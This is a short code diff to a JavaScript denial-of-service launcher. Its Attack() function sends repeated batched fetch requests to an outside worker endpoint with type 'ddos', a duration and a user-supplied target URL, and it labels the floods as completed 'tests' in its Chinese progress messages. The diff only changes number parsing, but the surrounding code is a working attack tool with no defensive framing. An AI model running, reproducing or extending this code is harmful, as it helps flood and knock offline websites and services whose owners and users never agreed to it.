@@ -1,5 +1,5 @@
 function atk(a, b, c) {
-    Attack(0+a, 0+b, c, "ddos", {update: function(now){document.getElementById('result').innerHTML = "已完成： " + now}}).then(s => {document.getElementById('result').innerHTML = "完成全部共"+s.success+"次測試";});
+    Attack(parseInt(a), parseInt(b), c, "ddos", {update: function(now){document.getElementById('result').innerHTML = "已完成： " + now}}).then(s => {document.getElementById('result').innerHTML = "完成全部共"+s.success+"次測試";});
 }
 async function Attack(blocks=10, attacks=10, target, type="ddos", func={update: function(){}}) {
     var now = 0;
@@ -9,7 +9,7 @@ async function Attack(blocks=10, attacks=10, target, type="ddos", func={update: 
         requests.push(
             fetch(`https://attack.jacob.workers.dev/?type=${type}&time=${attacks}&url=${target}`).then(r=>{
                 now += attacks;
-                func.update(now);
+                func.update(parseInt(now));
                 return r.ok;
             })
         );
